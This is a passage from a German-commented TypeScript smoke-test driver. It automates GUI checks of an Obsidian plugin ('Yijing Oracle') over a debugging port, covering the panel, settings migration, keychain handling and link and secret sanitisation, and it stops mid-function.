/**
 * GUI-Smoke-Treiber — faehrt die Checkliste aus `docs/SMOKE.md` gegen ein **laufendes**
 * Obsidian statt von Hand.
 *
 * Warum getrackt (CORE-TEST-02 b): Der ComfyUI-Adapter wurde am 2026-08-04 gebaut und lag
 * danach zwoelf Tage ungeprueft auf `main` — die Hand-Checkliste (11 Schritte, Handover-Note)
 * ist teuer genug, dass sie liegen bleibt. Was hier automatisiert ist, kostet beim naechsten
 * Mal einen Befehl.
 *
 * Was er prueft, das die vitest-Faelle strukturell nicht koennen: die **Settings-Migration
 * gegen eine echte Bestands-`data.json`** (der Unit-Test kennt nur das Objekt, nicht Obsidians
 * Lade-Kette), die **Bild-Sektion im echten Einstellungen-Fenster** und den **Bildweg ueber den
 * Kit-Vertrag `image-gen-provider`** (Bild-Kasten, Vorschau aus dem Vault, Speichern, Aufraeumen) —
 * gegen einen Fake-Anbieter, der ein echtes PNG ohne Server und ohne Modell schreibt. Die echte
 * Bilderzeugung gehoert in die Modell-Runde.
 *
 * ## Zweitinstanz (der richtige Ort fuer diesen Lauf — eigenes Profil, eigener Port)
 *
 * Der Port ist PFLICHT (`--port <n>`, Wert dieses Rezepts: 9400); der Treiber hat keinen Default, damit
 * ein vergessener Port nie die reguläre Instanz (9222) trifft. Die reguläre Instanz wird weder genutzt
 * noch beendet. Reihenfolge laut obsidian-plugins/AGENTS.md § Staging-Vaults (a)-(c):
 *
 * ```bash
 * echo "$STAGING_VAULTS_DIR"                                    # muss gesetzt sein (~/.zshenv)
 * UD=/tmp/obs-test-yijing-oracle; mkdir -p "$UD"
 * lsof -nP -iTCP:9400 -sTCP:LISTEN && echo "Port belegt — anderen nehmen"
 * pgrep -f "user-data-dir=$UD" && echo "Profil belegt — $UD-w19 nehmen"
 * npm run build && OBSIDIAN_PLUGIN_DIR="$STAGING_VAULTS_DIR/yijing-oracle/.obsidian/plugins/yijing-oracle" npm run deploy
 * # (a) aktuelle Version statt gebuendelter:
 * cp ~/Library/Application\ Support/obsidian/obsidian-<version>.asar "$UD"/
 * # Vault registrieren (Obsidian liest obsidian.json nur beim Start), Oberflaeche Englisch:
 * node -e 'const p=process.env.STAGING_VAULTS_DIR+"/yijing-oracle";require("fs").writeFileSync(process.argv[1]+"/obsidian.json",JSON.stringify({vaults:{yijing01:{path:p,ts:Date.now(),open:true}},language:"en"}))' "$UD"
 * /Applications/Obsidian.app/Contents/MacOS/Obsidian --user-data-dir="$UD" --remote-debugging-port=9400 &
 * # PID merken: beendet wird NUR sie, nie pkill/killall. Je Messlauf frischer Prozess.
 * python3 ~/.claude/hooks/obsidian-cdp-lock.py acquire --label yijing-oracle --intent "GUI-Smoke Zweitinstanz :9400" --exclusive focus --port 9400 --ttl 300
 * npm run smoke:gui -- --port 9400 --vault yijing-oracle    # (b) Restricted Mode, (c) Vertrauensdialog: macht `bereiteInstanzVor`
 * npm run smoke:gui -- --port 9400 --vault yijing-oracle --model <id>     # M4: genau dieses Modell auf :1234; ohne Flag wird nichts angefragt (M4 nichts gemessen)
 * npm run smoke:gui -- --port 9400 --vault yijing-oracle --lig <Ordner>   # D10: gebauter local-image-generator (main.js, manifest.json, styles.css); ohne Flag uebersprungen
 * python3 ~/.claude/hooks/obsidian-cdp-lock.py release
 * ```
 *
 * Der erste Lauf nach dem Anlegen eines Profils ist ein Aufwaermlauf und zaehlt nicht.
 *
 * ## Bilanz in vier Zustaenden (CORE-TEST-19)
 *
 * gruen · rot · uebersprungen · nichts gemessen; `PUNKTE` ist der Nenner. Uebersprungen heisst „in dieser
 * Lage nicht anwendbar" (`--lig` fehlt, Obsidian ohne native 1.13-Settings-API); „Gegenstand nicht
 * erreicht" (Einstellungen nicht zu oeffnen, kein Modell geladen, Anbieter nicht ladbar, Messung
 * abgebrochen) ist „nichts gemessen" und setzt Exit 1. Abbruch vor der ersten Messung: Exit 2.
 *
 * ⚠️ Chromium drosselt das Rendering nicht-fokussierter Fenster: ohne ein sichtbares Fenster bleibt die Ansicht leer
 * und man debuggt ein Phantom. `requireVisible` der Brücke holt es nach vorn (kein `osascript activate`: das trifft die reguläre Instanz).
 *
 * ## Was dieser Lauf am Wirt aendert — und zurueckdreht
 *
 * Der Migrations-Abschnitt schreibt eine kuenstliche Bestands-`data.json` und laedt das
 * Plugin neu. Der Vorwert wird **vor** dem `try` gelesen, zusaetzlich als Datei neben der
 * `data.json` gesichert (fuer den Fall, dass der Prozess hart abbricht) und im `finally`
 * zurueckgeschrieben. Erzeugte Notizen und Anhaenge wandern in den Papierkorb.
 */


import { Cdp, attachTo, beimAbbruch, bereiteInstanzVor, istAbgebrochen, entferneFakeManager, installFakeManager as installZentralFakeManager, pollUntil, requireVisible, schliesseEinstellungen } from "../../tools/obsidian-cdp/cdp.js";
import { startLlmStub } from "../../tools/obsidian-cdp/llm-stub.js";
import { messeFolge, zeichneFolge } from "../../tools/obsidian-cdp/folge.js";
import { createBilanz, parseArgs, runDriver } from "../../tools/obsidian-cdp/bilanz.js";
import { requireEigenerBuild } from "../../tools/obsidian-cdp/vault.js";
import { gegenprobeErreichbarkeit, gegenprobeFokus, messeDenkblockKopierbar as messeDenkblockZentral, messeErreichbarkeit, messeFokusErhalt, mitHoehe, zeichneDenkblock, zeichnePflicht, type PflichtBilanz, type PflichtTeilurteil } from "../../tools/obsidian-cdp/pflichtpunkte.js";
import { mkdirSync, writeFileSync } from "node:fs";
import { createServer, connect, type Server } from "node:net";
import { join } from "node:path";
import { boxAround, capture } from "../../tools/obsidian-cdp/shot.js";

const PLUGIN_ID = "yijing-oracle";
/** manifest.json → name. Nicht lokalisiert — taugt als Anker in der Einstellungs-Suche. */
const PLUGIN_NAME = "Yijing Oracle";
/** src/obsidian/view.ts: VIEW_TYPE_YIJING. */
const PANEL_VIEW = "yijing-oracle-panel";
const DATA_PATH = `.obsidian/plugins/${PLUGIN_ID}/data.json`;
/** Sicherungskopie fuer den Fall, dass der Lauf hart abbricht (Ctrl-C, Absturz). */
const DATA_RESCUE = `.obsidian/plugins/${PLUGIN_ID}/data.json.smoke-rescue`;
/** Schluesselbund-Eintraege dieses Plugins: je Endpunkt-Zeile einer unter diesem Praefix (Kit
 *  `endpointSecretPrefix`, `<pluginId>-ep-<id>`), dazu der alte Einzel-Eintrag bis 0.10
 *  (`LEGACY_API_KEY_SECRET_ID` in src/core/settings/migrate.ts — wird gelesen, nie geloescht). */
const EP_SECRET_PREFIX = `${PLUGIN_ID}-ep-`;
const LEGACY_SECRET_ID = "yijing-oracle-llm-api-key";

/** Bestands-`data.json` in der Form von 0.3.0 mit dem alten `image`-Block der Eigenbau-Anbindung (A1111-Endpunkt, Groesse,
 *  Schritte, Negativ-Prompt). Seit der Ablösung durch local-image-generator bleibt davon nur der Stil-Zusatz; die Frage ist,
 *  ob der ueberlebt und der Rest beim Laden verschwindet. */
const BESTAND_030 = {
  register: "neutral",
  readingLang: "auto",
  includeFrontmatter: true,
  image: {
    endpoint: "http://127.0.0.1:7860",
    styleSuffix: "ink wash painting, soft light, muted colors",
    negativePrompt: "text, watermark",
    size: 1024,
    steps: 31,
  },
  llm: {
    endpoints: ["http://127.0.0.1:1234", "http://127.0.0.1:11434"],
    model: "qwen3-30b",
    apiKey: "smoke-schluessel",
  },
};

/** Soll-Liste aller Pruefpunkte (der Nenner der Bilanz). Ein Name, der hier fehlt, laesst `createBilanz`
 *  werfen; ein Punkt, der nie aufgezeichnet wird, zaehlt als „nichts gemessen“. */
const PUNKTE = [
  "A1 Plugin aktiv",
  "A2 Panel oeffnet",
  "A3 Wurf erzeugt ein Hexagramm",
  "A4 Vorschau traegt Text",
  "A5 Frage-Feld ist nach dem Wurf leer",
  "B-1 Kein liegen gebliebener Smoke-Schluessel im Schluesselbund aus einem abgebrochenen Vorlauf",
  "B0 Plugin laedt mit Bestandsdaten",
  "B1 image-Block traegt nur noch den Stil-Zusatz (die Schluessel der Eigenbau-Anbindung fallen beim Laden weg)",
  "B2 Stil-Suffix des Bestands ueberlebt",
  "B5 LLM-Endpunktliste unveraendert (jetzt zwei Zeilen mit URL)",
  "B6 API-Schluessel ueberlebt die Migration (je Zeile, im Schluesselbund unter yijing-oracle-ep-<id>)",
  "B7 keine Alt-Leiche activeEndpoint",
  "B8 Altwert verlaesst data.json: wandert beim Laden in den Schluesselbund",
  "B9 Altwert llm.model wandert in die Zeilen, der Schluessel verschwindet (Speicher und data.json)",
  "C1 Einstellungen-Tab oeffnet",
  "C1b Keine Settings-Zeile „Model“ und keine Option „global model“",
  "C2 Bild-Sektion: Bildquelle und Stil-Suffix, kein Backend-, Endpunkt-, Workflow- oder Schritte-Feld",
  "C3 Der Hinweis folgt dem Anbieter: fehlt er, nennt er das Plugin; mit Anbieter nennt er die Quelle",
  "F1 Tab liefert deklarative Definitionen",
  "F2 bedingte Zeilen werden weggelassen, nicht versteckt",
  "F3 Oberflaeche zieht nach einer Wertaenderung nach",
  "F9 die Hilfe-Zeile steht als erste Zeile oben im Settings-Tab",
  "F4 Einstellungen erscheinen in Obsidians Einstellungs-Suche",
  "F5 Fallback-Pfad (< 1.13) zeichnet dieselbe Struktur",
  "F6 maskierte Zeile bleibt ueber Aliase auffindbar",
  "F7 API-Schluessel-Feld der Endpunkt-Zeile ist maskiert (nach „aendern“)",
  "F8 Eingabe im Feld landet im Schluesselbund (Eintrag der Zeile), nicht in data.json",
  "M1 Settings zeigen den Manager statt der lokalen Liste",
  "M2 Lauf nutzt den Manager-Endpunkt und das Default-Modell",
  "M2b Manager-Lauf nutzt gewaehltes Modell, nicht den Endpunkt-Default (C1)",
  "M3 Manager aus → lokale Liste in Settings und im Lauf",
  "M1b Manager erst nach dem ersten Oeffnen des Tabs installiert: die Settings zeigen ihn nach einem Tab-Wechsel",
  "N3 Gesendeter Body traegt die Modus-Defaults (Temperatur 0.7, Denkstufe medium)",
  "N1 Abschnitt „Anfrage“ klappt auf und zeigt die Felder des Modus",
  "N6 „Letzte Anfrage“ zeigt beim Oeffnen des Tabs den gesendeten Body",
  "N2 Zwei Bearbeitungen hintereinander (Temperatur, Denkstufe) speichern und lassen den Abschnitt offen",
  "N4 Gesendeter Body folgt den Einstellungen (Ueberschreibung 0.9, Denken aus → reasoning_effort none)",
  "N5 Zuruecksetzen entfernt die Ueberschreibung und laesst den Abschnitt offen",
  "V1 Zeile mit Klartext-Schluessel: nach resolve steht kein apiKey mehr in data.json, der Wert im Schluesselbund",
  "V2 Der Schluessel der Zeile geht als Bearer an den Endpunkt",
  "V3 Ein Geheimnis in der Frage geht als Platzhalter an den Draht, nicht im Klartext",
  "V4 Die Deutung zeigt das Original wieder (Schwaerzung ist umkehrbar)",
  "V5 Eine Antwort mit Bild-URL und Platzhalter erzeugt kein img-Element",
  "V6 Ein dataviewjs-Block in der Antwort rendert als Text, nicht als Codeblock",
  "V7 Die gespeicherte Notiz traegt die entschaerfte Form (```text statt ```dataviewjs und ```mermaid, kein Fernbild, auch nicht als Referenz-Definition), kein dataviewjs-Code im DOM",
  "V8 Die gespeicherte Notiz laedt das Fernbild nicht (Zaehler am Draht bleibt 0)",
  "V9 Zeile ohne Modell: das Panel nimmt das erste Modell der Liste und merkt es in der aktiven Zeile (setModel)",
  "L2 Folge-Regel: Hochscrollen mitten im Strom wird respektiert, die Ansicht springt nicht wieder nach unten",
  "L3 Kontrolle: die Deutung folgt dem Strom ohne Störung bis zum Ende",
  "L4 Kontrolle: die Deutung folgt auch bei absatzgroßen Stücken bis zum Ende",
  "L5 Wiederaufnahme: steht der Nutzer wieder unten, folgt die Deutung dem Strom wieder",
  "L1 Denkblock live: der Reasoning-Text ist waehrend des Stroms sichtbar und waechst, bevor die Antwort beginnt",
  "L1b Denkblock kopierbar: der Knopf legt den Denktext in die Zwischenablage, der Block klappt nicht um",
  "L1c Gegenprobe: lehnt die Zwischenablage ab, quittiert der Knopf nicht",
  "P1 Tippen in die Frage waehrend die Deutung streamt behaelt den Fokus",
  "P1b Gegenprobe: ein Neuzeichnen mit Fokusverlust macht P1 rot",
  "P2 jedes Bedienelement ist erreichbar (natuerliche Hoehe)",
  "P2b jedes Bedienelement ist erreichbar (kurzes Panel, 420 px)",
  "P2c Gegenprobe: ohne Rollbalken wird etwas unerreichbar",
  "L6 Gemma-Stub: nach dem Kanal-Ende steht im Antwortbereich nur die Antwort, das Denken im Denkblock",
  "M4 Deutung streamt gegen den echten Endpunkt",
  "D0 Ohne Bild-Anbieter fehlt der Bild-Kasten",
  "D1 Mit Bild-Anbieter erscheint der Bild-Kasten",
  "D2 Generieren startet",
  "D3 Bild kommt an: die Datei im Vault ist ein PNG, die Vorschau zeigt sie",
  "D4 Waehrend des Laufs steht der Status der Generierung",
  "D5 Szenen-Satz steht unter dem Bild",
  "D6 Prompt traegt Szene und Stil-Suffix, Zielordner ist der Anhaenge-Ordner",
  "D7 Neu generieren raeumt das ungespeicherte Bild weg",
  "D8 Fehlerwert des Anbieters: Meldung mit dem Grund, das Bild bleibt",
  "D9 Neuer Wurf raeumt ein ungespeichertes Bild weg",
  "D10 Echter local-image-generator ohne Modell: Bild-Kasten da, Knopf meldet den Grund statt eines Bildes",
  "E1 Speichern legt genau eine Notiz an",
  "E2 Notiz traegt den Reading-Text",
  "E3 Die Note bettet die vorhandene Bilddatei ein, es entsteht keine Kopie",
  "E4 Das gespeicherte Bild bleibt nach einem neuen Wurf",
  "Z-a Die Modellzeile steht genau einmal direkt unter dem Titel und traegt ein aria-label",
  "Z-b Das Dropdown listet die Modelle des Endpunkts plus Automatisch",
  "Z-c Ein Wechsel wirkt: die naechste Deutung geht mit dem gewaehlten Modell an den Draht",
  "Z-d Waehrend eine Deutung streamt, sind Dropdown und Neu-laden gesperrt, danach wieder frei",
  "Z-d2 Im Fenster zwischen Klick und Streambeginn (verzoegerte Aufloesung) ist die Zeile schon gesperrt",
  "Z-e Die Denk-Steuerung steht in der Zeile, es gibt keinen zweiten Denk-Knopf im Panel",
  "Z-f Bei 260 px Panelbreite laeuft die Zeile nicht ueber",
  "Z-g Modell- und Denkstufen-Wechsel ausserhalb der Zeile erscheinen in ihr, ohne dass das Panel neu zeichnet",
  "Z-h Nach Wurf, Deutung und Neuzeichnen bleibt es bei einer Zeile",
  "Z-i Nach einem Start ohne Endpunkt (Fruehausstieg, kein Neuzeichnen) ist die Zeile wieder frei",
  "Z-j Mit Manager steht neben den Modellen und Automatisch der Eintrag „Anderer Endpunkt“, seine Wahl oeffnet den Tab des Managers",
  "Z-k Mit Manager schreibt der Wechsel nur choice.model (endpoints unberuehrt), die naechste Deutung geht mit dem gewaehlten Modell an den Draht, Automatisch loescht die Wahl",
  "Z-l Kommt der Manager nach dem Plugin (layout-change), laedt die Zeile seine Liste neu, ohne dass das Panel neu zeichnet",
  "K-a Linkschutz im Default: obsidian://-, file:- und app:-Links der Deutung verlieren ihr Ziel, ein https-Link behaelt es",
  "K-b Mit dem Schalter bleibt der obsidian://-Link, file: und app: gehen weiter",
  "K-c Die zwei Zeilen stehen im Einstellungen-Tab, ein Klick auf den Schalter schreibt sein Feld",
  "K-d Ein gekappter Link der fertigen Deutung sieht aus wie Text (Farbe der Umgebung, kein Unterstrich, kein Zeiger, kein Icon), ein Link mit Ziel bleibt Link",
] as const;

const bilanz = createBilanz({ punkte: PUNKTE });

function record(name: string, passed: boolean, detail: string): void {
  bilanz.record(name as (typeof PUNKTE)[number], passed, detail);
}

/** In dieser Lage nicht anwendbar (Flag abgewaehlt, Obsidian ohne native 1.13-Settings-API). */
function skipped(name: string, reason: string): void {
  bilanz.skipped(name as (typeof PUNKTE)[number], reason);
}

/** Der Gegenstand des Punkts wurde nicht erreicht (Vorbedingung fehlt, Messung abgebrochen) —
 *  „nichts gemessen“, nie gruen, Exit 1. */
function unmeasured(name: string, reason: string): void {
  bilanz.unmeasured(name as (typeof PUNKTE)[number], reason);
}

const aufgezeichnet = (name: string): boolean => bilanz.eintraege().some((e) => e.name === name);

const schlaf = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));

// ─── Helfer, die den Pruefling kennen ──────────────────────────────────────────────

/** Plugin neu laden, ohne Obsidian neu zu starten. Danach ist die Instanz eine **andere** —
 *  jede gemerkte Referenz auf `plugin` ist tot. */
async function reloadPlugin(cdp: Cdp): Promise<void> {
  await cdp.evaluate(`
    await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
    await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
    await new Promise((r) => setTimeout(r, 600));
    return true;
  `);
}

async function readVaultFile(cdp: Cdp, path: string): Promise<string | null> {
  return cdp.evaluate<string | null>(`
    const p = ${JSON.stringify(path)};
    if (!(await app.vault.adapter.exists(p))) return null;
    return await app.vault.adapter.read(p);
  `);
}

async function writeVaultFile(cdp: Cdp, path: string, body: string): Promise<void> {
  await cdp.evaluate(`
    await app.vault.adapter.write(${JSON.stringify(path)}, ${JSON.stringify(body)});
    return true;
  `);
}

async function removeVaultFile(cdp: Cdp, path: string): Promise<void> {
  await cdp.evaluate(`
    const p = ${JSON.stringify(path)};
    if (await app.vault.adapter.exists(p)) await app.vault.adapter.remove(p);
    return true;
  `);
}

/** Alle Schluesselbund-Eintraege des Plugins (Zeilen-Praefix und alter Einzel-Eintrag) als
 *  Id → Wert; `null` als Ganzes, wenn Obsidian keinen Schluesselbund hat (< 1.11.4). */
type Bund = Record<string, string>;
async function schluesselbund(cdp: Cdp): Promise<Bund | null> {
  return cdp.evaluate<Bund | null>(`
    const s = app.secretStorage; if (!s) return null;
    const ids = (typeof s.listSecrets === "function" ? s.listSecrets() : []).filter((i) => i.startsWith(${JSON.stringify(EP_SECRET_PREFIX)}));
    ids.push(${JSON.stringify(LEGACY_SECRET_ID)});
    const out = {};
    for (const id of ids) { const v = s.getSecret(id); if (v) out[id] = v; }
    return out;
  `);
}

/** Zustand von vorher wiederherstellen: was dazugekommen ist, wird entfernt (deleteSecret gibt es
 *  zur Laufzeit, nicht in der .d.ts — s. _docs/LESSONS.md 2026-08-30; sonst Leerstring), was
 *  fehlt oder anders ist, wird zurueckgeschrieben. */
async function schluesselbundZuruecksetzen(cdp: Cdp, vorher: Bund): Promise<void> {
  await cdp.evaluate(`
    const s = app.secretStorage; if (!s) return false;
    const vorher = ${JSON.stringify(vorher)};
    const jetzt = (typeof s.listSecrets === "function" ? s.listSecrets() : []).filter((i) => i.startsWith(${JSON.stringify(EP_SECRET_PREFIX)}));
    jetzt.push(${JSON.stringify(LEGACY_SECRET_ID)});
    for (const id of jetzt) if (!(id in vorher) && s.getSecret(id)) { if (typeof s.deleteSecret === "function") s.deleteSecret(id); else s.setSecret(id, ""); }
    for (const [id, wert] of Object.entries(vorher)) if (s.getSecret(id) !== wert) s.setSecret(id, wert);
    return true;
  `);
}

/** Die Einstellungen des Prueflings auslesen — als reines Datenobjekt. */
async function settingsOf(cdp: Cdp): Promise<Record<string, unknown> | null> {
  return cdp.evaluate<Record<string, unknown> | null>(`
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    return p ? JSON.parse(JSON.stringify(p.settings)) : null;
  `);
}

/**
 * Wo die Einstellungen-Oberflaeche liegt.
 *
 * Ab Obsidian 1.13 sind die Einstellungen ein **eigenes Fenster**, kein Modal im
 * Hauptfenster (gemessen am 2026-08-16 gegen 1.13.7: `app.setting.activeTab.id` meldete
 * korrekt `yijing-oracle`, waehrend `document.querySelector(".modal.mod-settings")` im
 * Workspace-Fenster `null` blieb — der Aufruf gelingt, die Messung greift ins Leere).
 * Bis 1.12 war es ein Modal. Der Treiber haelt deshalb beide Faelle offen und leitet die
 * Antwort aus der Sache ab, statt eine Version anzunehmen.
 */
interface SettingsUi {
  /** Verbindung zu dem Renderer, der die Oberflaeche traegt. */
  cdp: Cdp;
  /** Selektor-Praefix: "" im eigenen Fenster, ".modal.mod-settings " beim Modal. */
  praefix: string;
  /** Nur gesetzt, wenn eine ZWEITE Verbindung aufgebaut wurde (die geschlossen gehoert). */
  eigenesFenster: boolean;
}

async function openSettingsTab(cdp: Cdp, port: number): Promise<SettingsUi | null> {
  await cdp.evaluate(`
    app.setting.open();
    await new Promise((r) => setTimeout(r, 400));
    app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
    await new Promise((r) => setTimeout(r, 800));
    return true;
  `);

  // Erkennung ODER statt UND: `.okit-ep-status` markiert die LOKALE Endpunkt-Liste, `.okit-collapsible-header`
  // den Abschnitt „Anfrage“, den die Verbindung in jedem Fall zeichnet — auch mit LLM Endpoint Manager,
  // wo die lokale Liste fehlt (Abschnitt M). Der Plugin-Name im Tab-Text taugt nur als dritter Anker:
  // ab 1.14 steht er im Inhaltsbereich nicht mehr (gemessen 2026-10-09; M1–M3 liefen daran ins Leere).
  const marker = `Boolean(root.querySelector(".okit-ep-status, .okit-collapsible-header")) || Boolean(root.textContent && root.textContent.includes(${JSON.stringify(PLUGIN_NAME)}))`;

  // Fall 1 (bis 1.12): Modal im selben Fenster.
  const alsModal = await cdp.evaluate<boolean>(
    `const root = document.querySelector(".modal.mod-settings"); return Boolean(root) && (${marker});`,
  );
  if (alsModal) return { cdp, praefix: ".modal.mod-settings ", eigenesFenster: false };

  // Fall 2 (ab 1.13): eigenes Fenster. Das Kriterium ist nicht der Titel (der ist
  // lokalisiert), sondern die Sache: kein Workspace, aber unsere Sektion im DOM.
  const zweit = await attachTo("settings", port, PLUGIN_ID);
  if (!zweit) return null;
  const da = await zweit.evaluate<boolean>(`const root = document; return ${marker};`);
  if (!da) {
    zweit.close();
    return null;
  }
  return { cdp: zweit, praefix: "", eigenesFenster: true };
}

/** Schliesst die Oberflaeche — der Befehl gehoert ins Hauptfenster, auch wenn gemessen
 *  wurde im zweiten. */
async function closeSettings(cdp: Cdp, ui: SettingsUi | null): Promise<void> {
  if (ui?.eigenesFenster) ui.cdp.close();
  await schliesseEinstellungen(cdp);
  await schlaf(200);
}

/** Wurzel-Ausdruck fuer Messungen in der Einstellungen-Oberflaeche. Im eigenen Fenster ist das `document.body`, beim Modal dessen
 *  Container — damit dieselben Selektoren in beiden Faellen dasselbe treffen. */
function wurzelAusdruck(ui: SettingsUi): string {
  // `document.body`, nicht `document`: `Document.textContent` ist immer null. M1 las damit seit jeher den
  // Leerstring und war rot, ohne je den Tab gemessen zu haben (gemessen 2026-10-09, Welle 15; die
  // „vorbestehende“ Baseline-Rotung war dieser Treiberfehler, kein Plugin-Befund).
  return ui.praefix ? `document.querySelector(".modal.mod-settings")` : `document.body`;
}

/** Die Zeile „Bildquelle“ im Settings-Tab: ihr Hinweistext (EN und DE; null = Zeile fehlt). */
async function bildquelleHinweis(ui: SettingsUi): Promise<string | null> {
  return ui.cdp.evaluate<string | null>(`
    const modal = ${wurzelAusdruck(ui)};
    if (!modal) return null;
    const row = [...modal.querySelectorAll(".setting-item")].find((r) => /^(image source|bildquelle)$/i.test((r.querySelector(".setting-item-name")?.textContent || "").trim()));
    return row ? (row.querySelector(".setting-item-description")?.textContent || "").trim() : null;
  `);
}

/** Das Orakel-Panel oeffnen und auf sein DOM warten. */
async function openPanel(cdp: Cdp): Promise<boolean> {
  await cdp.evaluate(`
    app.commands.executeCommandById(${JSON.stringify(`${PLUGIN_ID}:open-view`)});
    await new Promise((r) => setTimeout(r, 700));
    return true;
  `);
  const da = await pollUntil<boolean>(cdp, `return Boolean(document.querySelector(".yijing-oracle .yijing-title"));`, 8000, 400);
  return Boolean(da);
}

/** Einen Knopf im Panel ueber seine Position klicken — die Beschriftungen sind
 *  sprachabhaengig, die Reihenfolge der Aktionsreihen ist es nicht. */
async function clickPanelButton(cdp: Cdp, auswahl: string): Promise<boolean> {
  return Boolean(await cdp.evaluate<boolean>(`
    const el = document.querySelector(${JSON.stringify(auswahl)});
    if (!el) return false;
    el.click();
    await new Promise((r) => setTimeout(r, 400));
    return true;
  `));
}

// ─── Abschnitte ────────────────────────────────────────────────────────────────────

/** A — Laden und Panel (Handover-Schritt 1). */
/** Meldung von `bereiteInstanzVor`, falls das Plugin trotz Vorbereitung nicht geladen ist (gehoert in A1). */
let instanzHinweis = "";

async function abschnittPanel(cdp: Cdp): Promise<void> {
  console.log("\n── A · Laden und Panel ──");

  const aktiv = await cdp.evaluate<boolean>(`return Boolean(app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]);`);
  record("A1 Plugin aktiv", Boolean(aktiv), aktiv ? "app.plugins kennt die Instanz" : `Plugin nicht geladen${instanzHinweis ? ` — ${instanzHinweis}` : ""}`);
  if (!aktiv) return;

  const offen = await openPanel(cdp);
  record("A2 Panel oeffnet", offen, offen ? ".yijing-oracle mit Titel im DOM" : "Panel-DOM kam nicht zustande");
  if (!offen) return;

  // Frage stellen und werfen. Der Wurf-Knopf ist der einzige in der ERSTEN Aktionsreihe.
  await cdp.evaluate(`
    const q = document.querySelector(".yijing-oracle .yijing-question");
    if (q) { q.value = "Smoke-Lauf: was traegt diese Pruefung?"; q.dispatchEvent(new Event("input")); }
    return true;
  `);
  const geworfen = await clickPanelButton(cdp, ".yijing-oracle .yijing-actions button");
  await schlaf(500);

  const wurf = await cdp.evaluate<{ linien: number; vorschau: number; frageLeer: boolean }>(`
    const root = document.querySelector(".yijing-oracle");
    if (!root) return { linien: 0, vorschau: 0, frageLeer: false };
    const q = root.querySelector(".yijing-question");
    return {
      linien: root.querySelectorAll(".yijing-line").length,
      vorschau: (root.querySelector(".yijing-preview")?.textContent || "").trim().length,
      frageLeer: q ? q.value === "" : false,
    };
  `);
  record(
    "A3 Wurf erzeugt ein Hexagramm",
    geworfen && wurf.linien === 6,
    `${wurf.linien} Linien gezeichnet (erwartet 6)`,
  );
  record(
    "A4 Vorschau traegt Text",
    wurf.vorschau > 200,
    `${wurf.vorschau} Zeichen in .yijing-preview`,
  );
  // Regression aus 0.1.1: "Neue Frage" liess den alten Text stehen.
  record("A5 Frage-Feld ist nach dem Wurf leer", wurf.frageLeer, wurf.frageLeer ? "Feld geleert" : "alter Text steht noch");
}

/** B — Bestandsverhalten (Handover-Schritt 2). Der teuerste Punkt der Checkliste und
 *  der einzige, bei dem ein Fehlschlag Jays produktive Konfiguration betrifft. */
async function abschnittMigration(cdp: Cdp): Promise<void> {
  console.log("\n── B · Bestandsverhalten (Settings-Migration) ──");

  await writeVaultFile(cdp, DATA_PATH, JSON.stringify(BESTAND_030, null, 2));
  await reloadPlugin(cdp);

  const s = await settingsOf(cdp);
  if (!s) {
    record("B0 Plugin laedt mit Bestandsdaten", false, "keine Instanz nach dem Neuladen — Ladefehler");
    return;
  }
  record("B0 Plugin laedt mit Bestandsdaten", true, "Instanz nach dem Neuladen vorhanden");

  const img = (s.image ?? {}) as Record<string, unknown>;
  const llm = (s.llm ?? {}) as Record<string, unknown>;

  record(
    "B1 image-Block traegt nur noch den Stil-Zusatz (die Schluessel der Eigenbau-Anbindung fallen beim Laden weg)",
    Object.keys(img).length === 1 && "styleSuffix" in img,
    `Schluessel des image-Blocks: ${JSON.stringify(Object.keys(img))} (Bestand trug ${JSON.stringify(Object.keys(BESTAND_030.image))})`,
  );
  record(
    "B2 Stil-Suffix des Bestands ueberlebt",
    img.styleSuffix === BESTAND_030.image.styleSuffix,
    `styleSuffix=${JSON.stringify(img.styleSuffix)}`,
  );

  // Seit der Verbindung ist die Liste eine EndpointConfig[] (umgeschrieben: bis 0.10 ein string[]).
  const eps = Array.isArray(llm.endpoints) ? (llm.endpoints as Array<{ url?: string; apiKey?: string; secretId?: string }>) : [];
  record(
    "B5 LLM-Endpunktliste unveraendert (jetzt zwei Zeilen mit URL)",
    eps.length === 2 && eps[0]?.url === BESTAND_030.llm.endpoints[0] && eps[1]?.url === BESTAND_030.llm.endpoints[1],
    `endpoints=${JSON.stringify(eps.map((e) => e.url))}`,
  );
  const bund = await schluesselbund(cdp);
  // Der Fund aus dem Kit-0.23.0-Seed: ein globaler Schluessel, den eine Migration still
  // fallen laesst, ergibt "Endpunkt nie erreichbar" ohne jede Meldung. Seit der Verbindung
  // traegt JEDE Zeile den Schluessel (je Zeile ein Schluesselbund-Eintrag), nicht mehr ein
  // globales Feld; bei einem Schluesselbund steht der Wert dort, sonst in der Zeile.
  const wertVonZeile = (e: { apiKey?: string; secretId?: string }): string | undefined =>
    bund ? (e.secretId ? bund[e.secretId] : undefined) : e.apiKey;
  record(
    "B6 API-Schluessel ueberlebt die Migration (je Zeile, im Schluesselbund unter yijing-oracle-ep-<id>)",
    eps.length === 2 && eps.every((e) => wertVonZeile(e) === BESTAND_030.llm.apiKey)
      && (!bund || eps.every((e) => (e.secretId ?? "").startsWith(EP_SECRET_PREFIX))),
    `${bund ? "Schluesselbund" : "kein Schluesselbund (< 1.11.4), Zeile"}: ${JSON.stringify(eps.map((e) => ({ secretId: e.secretId ?? null, wert: wertVonZeile(e) ?? null })))}`,
  );
  // Gegenstueck zur Migration: die Leiche darf NICHT zurueckkommen.
  record(
    "B7 keine Alt-Leiche activeEndpoint",
    !("activeEndpoint" in llm),
    "activeEndpoint" in llm ? "Feld ist wieder da" : "Feld fehlt wie erwartet",
  );
  // B6 misst den Speicher, das hier misst die PLATTE (umgeschrieben: vorher `llm.apiKey` in
  // data.json). Mit Schluesselbund traegt data.json weder `llm.apiKey` noch ein `apiKey` an einer
  // Zeile; ohne (< 1.11.4) bleibt der Wert in der Zeile.
  const platte = JSON.parse((await readVaultFile(cdp, DATA_PATH)) ?? "{}") as { llm?: { apiKey?: string; endpoints?: Array<{ apiKey?: string }> } };
  const zeilenMitKlartext = (platte.llm?.endpoints ?? []).filter((e) => typeof e.apiKey === "string" && e.apiKey !== "").length;
  record(
    "B8 Altwert verlaesst data.json: wandert beim Laden in den Schluesselbund",
    bund
      ? platte.llm?.apiKey === undefined && zeilenMitKlartext === 0
